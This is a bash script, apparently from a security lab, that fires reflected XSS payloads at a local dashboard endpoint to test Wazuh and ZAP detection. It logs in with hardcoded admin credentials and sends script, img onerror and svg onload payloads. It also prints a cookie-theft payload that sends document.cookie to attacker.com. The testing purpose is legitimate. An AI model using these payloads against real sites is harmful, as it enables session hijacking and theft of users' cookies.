#!/bin/bash
# SafePipeline — XSS attack on /dashboard?message=
# Tool: curl (manual payloads)
# Detection: Wazuh alert (rule 100005) + ZAP scan finding
#
# Usage: bash xss_test.sh [target_ip] [target_port]
# Example: bash xss_test.sh localhost 5000
#
# ⚠️  Run ONLY against localhost or a controlled environment you own.

TARGET=${1:-localhost}
PORT=${2:-5000}
BASE_URL="http://$TARGET:$PORT"

echo "[*] SafePipeline — XSS Simulation"
echo "[*] Target : $BASE_URL/dashboard?message="
echo ""

# Step 1: Get a valid session cookie
echo "[*] Authenticating as admin..."
COOKIE_JAR=$(mktemp)
curl -s -c "$COOKIE_JAR" -X POST "$BASE_URL/login" \
    -d "username=admin&password=admin123" -L > /dev/null
echo "[+] Session obtained."
echo ""

# --- Payload 1: Basic alert ---
echo "[>] Payload 1 — Basic alert"
PAYLOAD='<script>alert("XSS")</script>'
URL="$BASE_URL/dashboard?message=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))" 2>/dev/null || echo "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E")"
RESP=$(curl -s -b "$COOKIE_JAR" "$URL")
if echo "$RESP" | grep -q "script"; then
    echo "    [VULNERABLE] XSS payload reflected in response"
else
    echo "    Response received (check browser for popup)"
fi
echo ""

# --- Payload 2: Image onerror ---
echo "[>] Payload 2 — img onerror"
PAYLOAD='<img src=x onerror=alert(1)>'
RESP=$(curl -s -b "$COOKIE_JAR" "$BASE_URL/dashboard?message=$PAYLOAD")
echo "    Payload sent: $PAYLOAD"
echo ""

# --- Payload 3: Cookie theft simulation ---
echo "[>] Payload 3 — Cookie theft (demo)"
PAYLOAD='<script>document.location="http://attacker.com/?c="+document.cookie</script>'
echo "    Payload: $PAYLOAD"
echo "    In a real attack this would send the session cookie to an attacker server."
echo ""

# --- Payload 4: DOM-based ---
echo "[>] Payload 4 — DOM injection"
PAYLOAD='<svg onload=alert(document.domain)>'
RESP=$(curl -s -b "$COOKIE_JAR" "$BASE_URL/dashboard?message=$PAYLOAD")
echo "    Payload sent: $PAYLOAD"
echo ""

echo "[+] Done. Open these URLs in a browser to see the XSS execute:"
echo "    $BASE_URL/dashboard?message=<script>alert('XSS')</script>"
echo ""
echo "    Check:"
echo "    - /var/log/safepipeline/app.log for xss_attempt events"
echo "    - Wazuh dashboard for alert (rule 100005 — XSS)"

rm -f "$COOKIE_JAR"
